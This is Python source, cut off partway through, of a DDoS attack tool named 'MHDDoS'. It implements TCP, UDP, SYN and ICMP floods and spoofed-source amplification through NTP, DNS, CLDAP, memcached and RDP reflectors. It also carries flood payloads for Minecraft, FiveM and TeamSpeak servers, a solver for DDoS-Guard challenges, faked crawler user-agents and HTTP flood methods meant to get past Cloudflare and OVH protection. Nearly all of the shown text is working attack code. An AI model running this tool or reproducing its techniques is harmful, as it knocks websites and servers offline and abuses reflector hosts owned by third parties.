#!/usr/bin/env python3
 
from concurrent.futures import ThreadPoolExecutor, as_completed
from contextlib import suppress
from itertools import cycle
from json import load
from logging import basicConfig, getLogger, shutdown
from math import log2, trunc
from multiprocessing import RawValue, Process, cpu_count
from multiprocessing import Manager as _Mgr
from os import urandom as randbytes
from pathlib import Path
from re import compile
from random import choice as randchoice, randint
from socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, SOCK_DGRAM, IPPROTO_ICMP,
                    SOCK_RAW, SOCK_STREAM, TCP_NODELAY, SOL_SOCKET, SO_SNDBUF, SO_RCVBUF, SO_KEEPALIVE,
                    SO_REUSEADDR,
                    gethostbyname,
                    gethostname, socket)
from ssl import CERT_NONE, SSLContext, create_default_context
import ssl
from struct import pack as data_pack
from subprocess import run, PIPE
from sys import argv
from sys import exit as _exit
from threading import Event, Thread, Lock
from time import sleep, time
from typing import Any, List, Set, Tuple
from urllib import parse
from uuid import UUID, uuid4

from PyRoxy import Proxy, ProxyChecker, ProxyType, ProxyUtiles
from PyRoxy import Tools as ProxyTools
from certifi import where
from cloudscraper import create_scraper
from dns import resolver
from icmplib import ping
from impacket.ImpactPacket import IP, TCP, UDP, Data, ICMP
from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
from requests import Response, Session, exceptions, get, cookies
from yarl import URL
from base64 import b64encode

basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
            datefmt="%H:%M:%S")
logger = getLogger("MHDDoS")
logger.setLevel("INFO")
ctx: SSLContext = create_default_context(cafile=where())
ctx.check_hostname = False
ctx.verify_mode = CERT_NONE
# Enforce only TLSv1.2+ (defense-in-depth: also disable older protocols explicitly)
if hasattr(ctx, "minimum_version") and hasattr(ssl, "TLSVersion"):
    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
# Disable insecure TLS versions for additional safety
if hasattr(ssl, "OP_NO_TLSv1"):
    ctx.options |= ssl.OP_NO_TLSv1
if hasattr(ssl, "OP_NO_TLSv1_1"):
    ctx.options |= ssl.OP_NO_TLSv1_1

__version__: str = "2.4 SNAPSHOT"
__dir__: Path = Path(__file__).parent
__ip__: Any = None
tor2webs = [
            'onion.city',
            'onion.cab',
            'onion.direct',
            'onion.sh',
            'onion.link',
            'onion.ws',
            'onion.pet',
            'onion.rip',
            'onion.plus',
            'onion.top',
            'onion.si',
            'onion.ly',
            'onion.my',
            'onion.sh',
            'onion.lu',
            'onion.casa',
            'onion.com.de',
            'onion.foundation',
            'onion.rodeo',
            'onion.lat',
            'tor2web.org',
            'tor2web.fi',
            'tor2web.blutmagie.de',
            'tor2web.to',
            'tor2web.io',
            'tor2web.in',
            'tor2web.it',
            'tor2web.xyz',
            'tor2web.su',
            'darknet.to',
            's1.tor-gateways.de',
            's2.tor-gateways.de',
            's3.tor-gateways.de',
            's4.tor-gateways.de',
            's5.tor-gateways.de'
        ]

with open(__dir__ / "config.json") as f:
    con = load(f)

with socket(AF_INET, SOCK_DGRAM) as s:
    s.connect(("8.8.8.8", 80))
    __ip__ = s.getsockname()[0]


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def exit(*message):
    if message:
        logger.error(bcolors.FAIL + " ".join(message) + bcolors.RESET)
    shutdown()
    _exit(1)


class Methods:
    LAYER7_METHODS: Set[str] = {
        "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
        "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
        "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP"
    }

    LAYER4_AMP: Set[str] = {
        "MEM", "NTP", "DNS", "ARD",
        "CLDAP", "CHAR", "RDP"
    }

    LAYER4_METHODS: Set[str] = {*LAYER4_AMP,
                                "TCP", "UDP", "SYN", "VSE", "MINECRAFT",
                                "MCBOT", "CONNECTION", "CPS", "FIVEM", "FIVEM-TOKEN",
                                "TS3", "MCPE", "ICMP", "OVH-UDP",
                                }

    ALL_METHODS: Set[str] = {*LAYER4_METHODS, *LAYER7_METHODS}


search_engine_agents = [
    # ---------------- Google ----------------
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Googlebot/2.1 (+http://www.googlebot.com/bot.html)",
    "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; "
    "+http://www.google.com/bot.html) Chrome/131.0.6778.204 Safari/537.36",
    "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; "
    "+http://www.google.com/bot.html) Chrome/134.0.6998.35 Safari/537.36",
    "Googlebot-Image/1.0",
    "Googlebot-Video/1.0",
    "Googlebot-News",
    "AdsBot-Google (+http://www.google.com/adsbot.html)",
    "AdsBot-Google-Mobile-Apps",
    "AdsBot-Google-Mobile (+http://www.google.com/mobile/adsbot.html)",
    "Mediapartners-Google",
    "FeedFetcher-Google; (+http://www.google.com/feedfetcher.html)",

    # ---------------- Bing / Microsoft ----------------
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "BingPreview/1.0b",
    "BingPreview/2.0",
    "AdIdxBot/2.0 (+http://www.bing.com/bingbot.htm)",

    # ---------------- Yahoo ----------------
    "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
    "Yahoo! Slurp China",

    # ---------------- Yandex ----------------
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots; mirror)",
    "YandexMobileBot/3.0 (+http://yandex.com/bots)",
    "YandexImages/3.0 (+http://yandex.com/bots)",
    "YandexVideo/3.0 (+http://yandex.com/bots)",
    "YandexNews/3.0 (+http://yandex.com/bots)",
    "YandexFavicons/1.0 (+http://yandex.com/bots)",
    "YandexWebmaster/2.0 (+http://yandex.com/bots)",
    "YandexPagechecker/1.0 (+http://yandex.com/bots)",
    "YandexImageResizer/1.0 (+http://yandex.com/bots)",

    # ---------------- Baidu ----------------
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
    "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)",
    "Baiduspider-image (+http://www.baidu.com/search/spider.html)",
    "Baiduspider-video (+http://www.baidu.com/search/spider.html)",

    # ---------------- DuckDuckGo ----------------
    "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)",
    "DuckDuckBot/2.0; (+http://duckduckgo.com/duckduckbot.html)",

    # ---------------- Applebot ----------------
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/18.0 Safari/605.1.15 (Applebot/0.1; "
    "+http://www.apple.com/go/applebot)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.6 Safari/605.1.15 (Applebot/0.1; "
    "+http://www.apple.com/go/applebot)",

    # ---------------- Facebook / Social ----------------
    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
    "facebookexternalhit/1.2 (+http://www.facebook.com/externalhit_uatext.php)",
    "Facebot/1.0",

    # ---------------- Twitter ----------------
    "Twitterbot/1.0",

    # ---------------- LinkedIn ----------------
    "LinkedInBot/1.0 (+https://www.linkedin.com/)",

    # ---------------- Pinterest ----------------
    "Pinterest/0.2 (+http://www.pinterest.com/bot.html)",
    "Pinterest (+https://www.pinterest.com/)",

    # ---------------- Other Major Bots ----------------
    "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
    "Mozilla/5.0 (compatible; AhrefsBot/9.0; +http://ahrefs.com/robot/)",
    "SemrushBot/7~bl (+http://www.semrush.com/bot.html)",
    "SemrushBot/3~bl (+http://www.semrush.com/bot.html)",
    "MJ12bot/v1.4.8 (http://mj12bot.com/)",
    "Sogou web spider/4.0 (+http://www.sogou.com/docs/help/webmasters.htm#07)",
    "Sogou inst spider/4.0 (+http://www.sogou.com/docs/help/webmasters.htm#07)",
    "Exabot/3.0 (+http://www.exabot.com/go/robot)",
    "SeznamBot/3.2 (http://napoveda.seznam.cz/seznambot-intro/)",
    "CCBot/2.0 (+http://commoncrawl.org/faq/)",
    "DotBot/1.1 (+http://www.opensiteexplorer.org/dotbot, help@moz.com)",
    "Mozilla/5.0 (compatible; GPTBot/1.0; +https://openai.com/gptbot)",
    "Mozilla/5.0 (compatible; Bytespider; spider-feedback@bytedance.com)",
    "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/131.0.6778.204 Mobile Safari/537.36 (compatible, Googlebot/2.1; +http://www.google.com/bot.html)",
]


class Counter:
    def __init__(self, value=0):
        self._value = RawValue('q', value)

    def __iadd__(self, value):
        self._value.value += value
        return self

    def __int__(self):
        return self._value.value

    def set(self, value):
        self._value.value = value
        return self


REQUESTS_SENT = Counter()
BYTES_SEND = Counter()


class Tools:
    IP = compile("(?:\\d{1,3}\\.){3}\\d{1,3}")
    protocolRex = compile('"protocol":(\\d+)')

    @staticmethod
    def humanbytes(i: int, binary: bool = False, precision: int = 2):
        MULTIPLES = [
            "B", "k{}B", "M{}B", "G{}B", "T{}B", "P{}B", "E{}B", "Z{}B", "Y{}B"
        ]
        if i > 0:
            base = 1024 if binary else 1000
            multiple = trunc(log2(i) / log2(base))
            value = i / pow(base, multiple)
            suffix = MULTIPLES[multiple].format("i" if binary else "")
            return f"{value:.{precision}f} {suffix}"
        else:
            return "-- B"

    @staticmethod
    def humanformat(num: int, precision: int = 2):
        suffixes = ['', 'k', 'm', 'g', 't', 'p']
        if num > 999:
            obje = sum(
                [abs(num / 1000.0 ** x) >= 1 for x in range(1, len(suffixes))])
            return f'{num / 1000.0 ** obje:.{precision}f}{suffixes[obje]}'
        else:
            return num

    @staticmethod
    def sizeOfRequest(res: Response) -> int:
        size: int = len(res.request.method)
        size += len(res.request.url)
        size += len('\r\n'.join(f'{key}: {value}'
                                for key, value in res.request.headers.items()))
        return size

    @staticmethod
    def send(sock: socket, packet: bytes):
        global BYTES_SEND, REQUESTS_SENT
        try:
            sock.sendall(packet)
        except Exception:
            return False
        BYTES_SEND += len(packet)
        REQUESTS_SENT += 1
        return True

    @staticmethod
    def sendto(sock, packet, target):
        global BYTES_SEND, REQUESTS_SENT
        if not sock.sendto(packet, target):
            return False
        BYTES_SEND += len(packet)
        REQUESTS_SENT += 1
        return True

    @staticmethod
    def dgb_solver(url, ua, pro=None):
        s = None
        idss = None
        with Session() as s:
            if pro:
                s.proxies = pro
            hdrs = {
                "User-Agent": ua,
                "Accept": "text/html",
                "Accept-Language": "en-US",
                "Connection": "keep-alive",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "TE": "trailers",
                "DNT": "1"
            }
            with s.get(url, headers=hdrs) as ss:
                for key, value in ss.cookies.items():
                    s.cookies.set_cookie(cookies.create_cookie(key, value))
            hdrs = {
                "User-Agent": ua,
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Referer": url,
                "Sec-Fetch-Dest": "script",
                "Sec-Fetch-Mode": "no-cors",
                "Sec-Fetch-Site": "cross-site"
            }
            with s.post("https://check.ddos-guard.net/check.js", headers=hdrs) as ss:
                for key, value in ss.cookies.items():
                    if key == '__ddg2':
                        idss = value
                    s.cookies.set_cookie(cookies.create_cookie(key, value))

            hdrs = {
                "User-Agent": ua,
                "Accept": "image/webp,*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Cache-Control": "no-cache",
                "Referer": url,
                "Sec-Fetch-Dest": "script",
                "Sec-Fetch-Mode": "no-cors",
                "Sec-Fetch-Site": "cross-site"
            }
            with s.get(f"{url}.well-known/ddos-guard/id/{idss}", headers=hdrs) as ss:
                for key, value in ss.cookies.items():
                    s.cookies.set_cookie(cookies.create_cookie(key, value))
                return s

        return False

    @staticmethod
    def safe_close(sock=None):
        if sock:
            sock.close()


class Minecraft:
    @staticmethod
    def varint(d: int) -> bytes:
        o = b''
        while True:
            b = d & 0x7F
            d >>= 7
            o += data_pack("B", b | (0x80 if d > 0 else 0))
            if d == 0:
                break
        return o

    @staticmethod
    def data(*payload: bytes) -> bytes:
        payload = b''.join(payload)
        return Minecraft.varint(len(payload)) + payload

    @staticmethod
    def short(integer: int) -> bytes:
        return data_pack('>H', integer)

    @staticmethod
    def long(integer: int) -> bytes:
        return data_pack('>q', integer)

    @staticmethod
    def handshake(target: Tuple[str, int], version: int, state: int) -> bytes:
        return Minecraft.data(Minecraft.varint(0x00),
                              Minecraft.varint(version),
                              Minecraft.data(target[0].encode()),
                              Minecraft.short(target[1]),
                              Minecraft.varint(state))

    @staticmethod
    def handshake_forwarded(target: Tuple[str, int], version: int, state: int, ip: str, uuid: UUID) -> bytes:
        return Minecraft.data(Minecraft.varint(0x00),
                              Minecraft.varint(version),
                              Minecraft.data(
                                  target[0].encode(),
                                  b"\x00",
                                  ip.encode(),
                                  b"\x00",
                                  uuid.hex.encode()
                              ),
                              Minecraft.short(target[1]),
                              Minecraft.varint(state))

    @staticmethod
    def login(protocol: int, username: str) -> bytes:
        if isinstance(username, str):
            username = username.encode()
        return Minecraft.data(Minecraft.varint(0x00 if protocol >= 391 else \
                                               0x01 if protocol >= 385 else \
                                               0x00),
                              Minecraft.data(username))

    @staticmethod
    def keepalive(protocol: int, num_id: int) -> bytes:
        return Minecraft.data(Minecraft.varint(0x0F if protocol >= 755 else \
                                               0x10 if protocol >= 712 else \
                                               0x0F if protocol >= 471 else \
                                               0x10 if protocol >= 464 else \
                                               0x0E if protocol >= 389 else \
                                               0x0C if protocol >= 386 else \
                                               0x0B if protocol >= 345 else \
                                               0x0A if protocol >= 343 else \
                                               0x0B if protocol >= 336 else \
                                               0x0C if protocol >= 318 else \
                                               0x0B if protocol >= 107 else \
                                               0x00),
                              Minecraft.long(num_id) if protocol >= 339 else \
                              Minecraft.varint(num_id))

    @staticmethod
    def chat(protocol: int, message: str) -> bytes:
        return Minecraft.data(Minecraft.varint(0x03 if protocol >= 755 else \
                                               0x03 if protocol >= 464 else \
                                               0x02 if protocol >= 389 else \
                                               0x01 if protocol >= 343 else \
                                               0x02 if protocol >= 336 else \
                                               0x03 if protocol >= 318 else \
                                               0x02 if protocol >= 107 else \
                                               0x01),
                              Minecraft.data(message.encode()))


# noinspection PyBroadException,PyUnusedLocal
class Layer4(Thread):
    _method: str
    _target: Tuple[str, int]
    _ref: Any
    SENT_FLOOD: Any
    _amp_payloads = cycle
    _proxies: List[Proxy] = None

    def __init__(self,
                 target: Tuple[str, int],
                 ref: List[str] = None,
                 method: str = "TCP",
                 synevent: Event = None,
                 proxies: Set[Proxy] = None,
                 protocolid: int = 74):
        Thread.__init__(self, daemon=True)
        self._amp_payload = None
        self._amp_payloads = cycle([])
        self._ref = ref
        self.protocolid = protocolid
        self._method = method
        self._target = target
        self._synevent = synevent
        if proxies:
            self._proxies = list(proxies)

        self.methods = {
            "UDP": self.UDP,
            "SYN": self.SYN,
            "VSE": self.VSE,
            "TS3": self.TS3,
            "MCPE": self.MCPE,
            "FIVEM": self.FIVEM,
            "FIVEM-TOKEN": self.FIVEMTOKEN,
            "OVH-UDP": self.OVHUDP, 
            "MINECRAFT": self.MINECRAFT,
            "CPS": self.CPS,
            "CONNECTION": self.CONNECTION,
            "MCBOT": self.MCBOT,
        }

    def run(self) -> None:
        if self._synevent: self._synevent.wait()
        self.select(self._method)
        while self._synevent.is_set():
            self.SENT_FLOOD()

    def open_connection(self,
                        conn_type=AF_INET,
                        sock_type=SOCK_STREAM,
                        proto_type=IPPROTO_TCP):
        if self._proxies:
            s = randchoice(self._proxies).open_socket(
                conn_type, sock_type, proto_type)
        else:
            s = socket(conn_type, sock_type, proto_type)
        s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        s.settimeout(.9)
        s.connect(self._target)
        return s

    def TCP(self) -> None:
        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while Tools.send(s, randbytes(1024)):
                continue
        Tools.safe_close(s)

    def MINECRAFT(self) -> None:
        handshake = Minecraft.handshake(self._target, self.protocolid, 1)
        ping = Minecraft.data(b'\x00')

        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while Tools.send(s, handshake):
                Tools.send(s, ping)
        Tools.safe_close(s)

    def CPS(self) -> None:
        global REQUESTS_SENT
        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            REQUESTS_SENT += 1
        Tools.safe_close(s)

    def alive_connection(self) -> None:
        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while s.recv(1):
                continue
        Tools.safe_close(s)

    def CONNECTION(self) -> None:
        global REQUESTS_SENT
        with suppress(Exception):
            Thread(target=self.alive_connection).start()
            REQUESTS_SENT += 1

    def UDP(self) -> None:
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, randbytes(1024), self._target):
                continue
        Tools.safe_close(s)

    def OVHUDP(self) -> None:
        with socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while True:
                for payload in self._generate_ovhudp():
                    Tools.sendto(s, payload, self._target)
        Tools.safe_close(s)

    def ICMP(self) -> None:
        payload = self._genrate_icmp()
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_ICMP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def SYN(self) -> None:
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while Tools.sendto(s, self._genrate_syn(), self._target):
                continue
        Tools.safe_close(s)

    def AMP(self) -> None:
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while Tools.sendto(s, *next(self._amp_payloads)):
                continue
        Tools.safe_close(s)

    def MCBOT(self) -> None:
        s = None

        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            Tools.send(s, Minecraft.handshake_forwarded(self._target,
                                                        self.protocolid,
                                                        2,
                                                        ProxyTools.Random.rand_ipv4(),
                                                        uuid4()))
            username = f"{con['MCBOT']}{ProxyTools.Random.rand_str(5)}"
            password = b64encode(username.encode()).decode()[:8].title()
            Tools.send(s, Minecraft.login(self.protocolid, username))
            
            sleep(1.5)

            Tools.send(s, Minecraft.chat(self.protocolid, "/register %s %s" % (password, password)))
            Tools.send(s, Minecraft.chat(self.protocolid, "/login %s" % password))

            while Tools.send(s, Minecraft.chat(self.protocolid, str(ProxyTools.Random.rand_str(256)))):
                sleep(1.1)

        Tools.safe_close(s)

    def VSE(self) -> None:
        global BYTES_SEND, REQUESTS_SENT
        payload = (b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
                   b'\x20\x51\x75\x65\x72\x79\x00')
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def FIVEMTOKEN(self) -> None:
        global BYTES_SEND, REQUESTS_SENT

        # Generete token and guid
        token = str(uuid4())
        steamid_min = 76561197960265728
        steamid_max = 76561199999999999
        guid = str(randint(steamid_min, steamid_max))

        # Build Payload
        payload_str = f"token={token}&guid={guid}"
        payload = payload_str.encode('utf-8')

        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def FIVEM(self) -> None:
        global BYTES_SEND, REQUESTS_SENT
        payload = b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def TS3(self) -> None:
        global BYTES_SEND, REQUESTS_SENT
        payload = b'\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02'
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def MCPE(self) -> None:
        global BYTES_SEND, REQUESTS_SENT
        payload = (b'\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f'
                   b'\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20'
                   b'\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c'
                   b'\x73')
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def _generate_ovhudp(self) -> List[bytes]:
        packets = []

        methods = ["PGET", "POST", "HEAD", "OPTIONS", "PURGE"]
        paths = ['/0/0/0/0/0/0', '/0/0/0/0/0/0/', '\\0\\0\\0\\0\\0\\0', '\\0\\0\\0\\0\\0\\0\\', '/', '/null', '/%00%00%00%00']

        for _ in range(randint(2, 4)):
            ip = IP()
            ip.set_ip_src(__ip__)
            ip.set_ip_dst(self._target[0])

            udp = UDP()
            udp.set_uh_sport(randint(1024, 65535))
            udp.set_uh_dport(self._target[1])

            payload_size = randint(1024, 2048)
            random_part = randbytes(payload_size).decode("latin1", "ignore")

            method = randchoice(methods)
            path = randchoice(paths)

            payload_str = (
                f"{method} {path}{random_part} HTTP/1.1\n"
                f"Host: {self._target[0]}:{self._target[1]}\r\n\r\n"
            )

            payload = payload_str.encode("latin1", "ignore")

            udp.contains(Data(payload))
            ip.contains(udp)

            packets.append(ip.get_packet())

        return packets

    def _genrate_syn(self) -> bytes:
        ip: IP = IP()
        ip.set_ip_src(__ip__)
        ip.set_ip_dst(self._target[0])
        tcp: TCP = TCP()
        tcp.set_SYN()
        tcp.set_th_flags(0x02)
        tcp.set_th_dport(self._target[1])
        tcp.set_th_sport(ProxyTools.Random.rand_int(32768, 65535))
        ip.contains(tcp)
        return ip.get_packet()

    def _genrate_icmp(self) -> bytes:
        ip: IP = IP()
        ip.set_ip_src(__ip__)
        ip.set_ip_dst(self._target[0])
        icmp: ICMP = ICMP()
        icmp.set_icmp_type(icmp.ICMP_ECHO)
        icmp.contains(Data(b"A" * ProxyTools.Random.rand_int(16, 1024)))
        ip.contains(icmp)
        return ip.get_packet()

    def _generate_amp(self):
        payloads = []
        for ref in self._ref:
            ip: IP = IP()
            ip.set_ip_src(self._target[0])
            ip.set_ip_dst(ref)

            ud: UDP = UDP()
            ud.set_uh_dport(self._amp_payload[1])
            ud.set_uh_sport(self._target[1])

            ud.contains(Data(self._amp_payload[0]))
            ip.contains(ud)

            payloads.append((ip.get_packet(), (ref, self._amp_payload[1])))
        return payloads

    def select(self, name):
        self.SENT_FLOOD = self.TCP
        for key, value in self.methods.items():
            if name == key:
                self.SENT_FLOOD = value
            elif name == "ICMP":
                self.SENT_FLOOD = self.ICMP
                self._target = (self._target[0], 0)
            elif name == "RDP":
                self._amp_payload = (
                    b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00',
                    3389)
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())
            elif name == "CLDAP":
                self._amp_payload = (
                    b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00'
                    b'\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00',
                    389)
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())
            elif name == "MEM":
                self._amp_payload = (
                    b'\x00\x01\x00\x00\x00\x01\x00\x00gets p h e\n', 11211)
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())
            elif name == "CHAR":
                self._amp_payload = (b'\x01', 19)
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())
            elif name == "ARD":
                self._amp_payload = (b'\x00\x14\x00\x00', 3283)
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())
            elif name == "NTP":
                self._amp_payload = (b'\x17\x00\x03\x2a\x00\x00\x00\x00', 123)
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())
            elif name == "DNS":
                self._amp_payload = (
                    b'\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00'
                    b'\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00',
                    53)
                self.SENT_FLOOD = self.AMP
                self._amp_payloads = cycle(self._generate_amp())


# noinspection PyBroadException,PyUnusedLocal
class HttpFlood(Thread):
    _proxies: List[Proxy] = None
    _payload: str
    _defaultpayload: Any
    _req_type: str
    _useragents: List[str]
    _referers: List[str]
    _target: URL
    _method: str
    _rpc: int
    _synevent: Any
    SENT_FLOOD: Any

    def __init__(self,
                 thread_id: int,
                 target: URL,
                 host: str,
                 method: str = "GET",
                 rpc: int = 1,
                 synevent: Event = None,
                 useragents: Set[str] = None,
                 referers: Set[str] = None,
                 proxies: Set[Proxy] = None) -> None:
        Thread.__init__(self, daemon=True)
        self.SENT_FLOOD = None
        self._thread_id = thread_id
        self._synevent = synevent
        self._rpc = rpc
        self._method = method
        self._target = target
        self._host = host
        self._raw_target = (self._host, (self._target.port or 80))

        if not self._target.host[len(self._target.host) - 1].isdigit():
            self._raw_target = (self._host, (self._target.port or 80))

        self.methods = {
            "POST": self.POST,
            "CFB": self.CFB,
            "CFBUAM": self.CFBUAM,
            "XMLRPC": self.XMLRPC,
            "BOT": self.BOT,
            "APACHE": self.APACHE,
            "BYPASS": self.BYPASS,
            "DGB": self.DGB,
            "OVH": self.OVH,
            "AVB": self.AVB,
            "STRESS": self.STRESS,
            "DYN": self.DYN,
            "SLOW": self.SLOW,
            "GSB": self.GSB,
            "RHEX": self.RHEX,
            "STOMP": self.STOMP,
            "NULL": self.NULL,
            "COOKIE": self.COOKIES,
            "TOR": self.TOR,
            "EVEN": self.EVEN,
            "DOWNLOADER": self.DOWNLOADER,
            "BOMB": self.BOMB,
            "PPS": self.PPS,
            "KILLER": self.KILLER,
        }

        if not referers:
            referers: List[str] = [
                "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
                ",https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer"
                "/sharer.php?u=",
                ",https://drive.google.com/viewerng/viewer?url=",
                ",https://www.google.com/translate?u="
            ]
        self._referers = list(referers)
        if proxies:
            self._proxies = list(proxies)

        if not useragents:
            useragents: List[str] = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0',
                'Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0',
                'Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0',
